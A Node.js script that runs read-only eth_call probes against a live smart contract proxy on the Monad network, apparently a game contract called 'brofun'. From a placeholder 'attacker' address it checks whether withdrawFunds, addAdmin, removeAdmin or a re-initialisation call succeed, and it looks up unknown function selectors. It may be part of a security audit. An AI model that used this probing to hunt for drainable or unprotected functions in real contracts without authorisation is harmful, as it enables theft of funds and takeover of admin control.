const https = require('https');

const RPC = 'https://rpc.monad.xyz';
const PROXY = '0xDF7A89Fc62e5120C4617f143C7AcDDAB0D1Ca7A2';
const OWNER = '0x91d6ddd506a952bb8ccefe0cf3609ebde8c8524d';
const ADMIN = '0x4a03ab0327cef024f6d06ed6ed600f6c911c811f';
const GAME1_ADDR = '0x5ba865cf3652eba213631d7e0e2d7294bb6be781';
// Attacker address (test only - no private key, read-only simulation)
const ATTACKER = '0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef';

function rpc(method, params, id=1) {
  return new Promise((res, rej) => {
    const body = JSON.stringify({ jsonrpc:'2.0', method, params, id });
    const req = https.request(RPC, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
    }, (r) => {
      let data = '';
      r.on('data', c => data += c);
      r.on('end', () => { try { res(JSON.parse(data)); } catch(e) { rej(e); } });
    });
    req.on('error', rej);
    req.write(body);
    req.end();
  });
}

function fetch4byte(selector) {
  return new Promise((res) => {
    const url = `https://www.4byte.directory/api/v1/signatures/?hex_signature=${selector}`;
    const req = https.get(url, { headers: { 'User-Agent': 'Mozilla/5.0' } }, (r) => {
      let data = '';
      r.on('data', c => data += c);
      r.on('end', () => { try { const j = JSON.parse(data); res(j.results?.map(r => r.text_signature) || []); } catch(e) { res([]); } });
    });
    req.on('error', () => res([]));
  });
}

async function ethCall(sel, args='', from=null) {
  const callObj = { to: PROXY, data: sel + args };
  if (from) callObj.from = from;
  const r = await rpc('eth_call', [callObj, 'latest']);
  return r;
}

function pad32addr(addr) {
  return '000000000000000000000000' + addr.slice(2).toLowerCase();
}

function pad32uint(n) {
  return n.toString(16).padStart(64, '0');
}

async function main() {
  console.log('=== CRITICAL VULNERABILITY PROBING ===\n');

  // 1. withdrawFunds(uint256,address) = 0x744bfe61
  console.log('--- [CRITICAL] withdrawFunds(uint256,address) ---');
  const withdrawTests = [
    { label: 'from null (no sender)', from: null },
    { label: 'from attacker', from: ATTACKER },
    { label: 'from owner', from: OWNER },
  ];
  const amount1wei = pad32uint(1); // 1 wei
  const attackerArg = pad32addr(ATTACKER);

  for (const t of withdrawTests) {
    const callObj = { to: PROXY, data: '0x744bfe61' + amount1wei + attackerArg };
    if (t.from) callObj.from = t.from;
    const r = await rpc('eth_call', [callObj, 'latest']);
    if (r.error) {
      console.log(`  ${t.label}: REVERT - "${r.error.message}" data: ${r.error.data || 'none'}`);
    } else {
      console.log(`  ${t.label}: SUCCESS! result=${r.result}`);
    }
  }

  // 2. addAdmin(address) = 0x70480275
  console.log('\n--- [CRITICAL] addAdmin(address) ---');
  for (const t of withdrawTests) {
    const callObj = { to: PROXY, data: '0x70480275' + pad32addr(ATTACKER) };
    if (t.from) callObj.from = t.from;
    const r = await rpc('eth_call', [callObj, 'latest']);
    if (r.error) {
      console.log(`  ${t.label}: REVERT - "${r.error.message}" data: ${r.error.data || 'none'}`);
    } else {
      console.log(`  ${t.label}: SUCCESS! result=${r.result}`);
    }
  }

  // 3. removeAdmin(address) = 0x1785f53c
  console.log('\n--- [HIGH] removeAdmin(address) ---');
  const callRemove = { to: PROXY, data: '0x1785f53c' + pad32addr(OWNER) };
  const rRemove = await rpc('eth_call', [callRemove, 'latest']);
  console.log('removeAdmin(owner) from null:', rRemove.error ? `REVERT - "${rRemove.error.message}"` : `SUCCESS: ${rRemove.result}`);

  // 4. messagePrefix() = 0x91da2b3d
  console.log('\n--- Signature prefix ---');
  const msgPrefix = await ethCall('0x91da2b3d');
  if (msgPrefix.result) {
    // Decode ABI encoded string
    const hex = msgPrefix.result.slice(2);
    const offset = parseInt(hex.slice(0,64), 16) * 2;
    const len = parseInt(hex.slice(offset, offset+64), 16);
    const str = Buffer.from(hex.slice(offset+64, offset+64+len*2), 'hex').toString('utf8');
    console.log('messagePrefix():', JSON.stringify(str));
  } else {
    console.log('messagePrefix(): ERROR', msgPrefix.error);
  }

  // 5. getGameDetails for multiple games
  console.log('\n--- Game details (gameIds 1-10) ---');
  for (let i = 1; i <= 10; i++) {
    const r = await ethCall('0x1b31abda', pad32uint(i));
    if (r.result && r.result !== '0x') {
      console.log(`game[${i}]: ${r.result}`);
    }
  }
  // Also try recent game
  const gameCounter = 520198;
  console.log(`\nRecent games (around ${gameCounter}):`);
  for (const gid of [gameCounter, gameCounter-1, gameCounter-2, gameCounter-10, gameCounter-100]) {
    const r = await ethCall('0x1b31abda', pad32uint(gid));
    if (r.result && r.result !== '0x') {
      console.log(`game[${gid}]: ${r.result}`);
    }
  }

  // 6. 0x117a5b90 with multiple args
  console.log('\n--- 0x117a5b90 (game query?) ---');
  for (let i = 1; i <= 5; i++) {
    const r = await ethCall('0x117a5b90', pad32uint(i));
    if (r.result && r.result !== '0x') {
      console.log(`0x117a5b90(${i}): ${r.result}`);
    }
  }

  // 7. isAdmin checks
  console.log('\n--- Admin checks ---');
  for (const [name, addr] of [['owner', OWNER], ['admin', ADMIN], ['game1', GAME1_ADDR]]) {
    const r = await ethCall('0x24d7806c', pad32addr(addr));
    console.log(`isAdmin(${name}): ${r.result}`);
  }

  // 8. 0xd99e1a48 with address arg (might be getBalance or similar)
  console.log('\n--- 0xd99e1a48 (address arg) ---');
  for (const [name, addr] of [['owner', OWNER], ['proxy', PROXY], ['game1', GAME1_ADDR]]) {
    const r = await ethCall('0xd99e1a48', pad32addr(addr));
    if (r.result) console.log(`0xd99e1a48(${name}): ${r.result}`);
  }

  // 9. 0x278d1a3e with address arg
  console.log('\n--- 0x278d1a3e (address arg) ---');
  for (const [name, addr] of [['owner', OWNER], ['proxy', PROXY], ['attacker', ATTACKER]]) {
    const r = await ethCall('0x278d1a3e', pad32addr(addr));
    if (r.result) console.log(`0x278d1a3e(${name}): ${r.result}`);
  }

  // 10. Look up remaining selectors
  console.log('\n--- Remaining 4byte lookups ---');
  const remaining = [
    '0xd0d65411', '0xd99e1a48', '0x9fda24a4', '0x70480275',
    '0x47f0e29b', '0x278d1a3e', '0x32a73b58', '0x3893c500',
    '0x02153e29', '0x03c068b8', '0x0a959f20', '0x0c4c8d89',
    '0x117a5b90', '0x14346d07', '0x565b3480', '0x0819bdcd',
    '0x0813eb43', '0x014f6fe5', '0x04a4fb41', '0x26052d97',
    '0x37d7bbf5', '0x038f9ba5', '0x1e9acf17', '0x877c74cb',
    '0x91268860', '0x3ffe5d2d', '0xea8e4eb5', '0x7d4e2731',
    '0xf097ad14', '0x39cff220', '0x21eed1cd', '0xf7c071fd',
    '0x1afcd79f', '0x7484bb57', '0x1e4fbdf7', '0x6b60901b',
    '0x7bfe7a43', '0x6e2d05a5'
  ];
  for (const sel of remaining) {
    const matches = await fetch4byte(sel);
    if (matches.length > 0) {
      console.log(`${sel}: ${matches.join(' | ')}`);
    }
  }

  // 11. Check initialize(string) - re-init attack possible?
  console.log('\n--- Re-initialization attack check ---');
  // initialize(string) with "brofun" arg
  const strArg = '0000000000000000000000000000000000000000000000000000000000000020' + // offset
                 '0000000000000000000000000000000000000000000000000000000000000006' + // length
                 '62726f66756e000000000000000000000000000000000000000000000000000000'; // "brofun"
  const rInit = await rpc('eth_call', [{ to: PROXY, data: '0xf62d1888' + strArg, from: ATTACKER }, 'latest']);
  console.log('initialize("brofun") from attacker:', rInit.error ? `REVERT - "${rInit.error.message}"` : `SUCCESS: ${rInit.result}`);
}

main().catch(console.error);
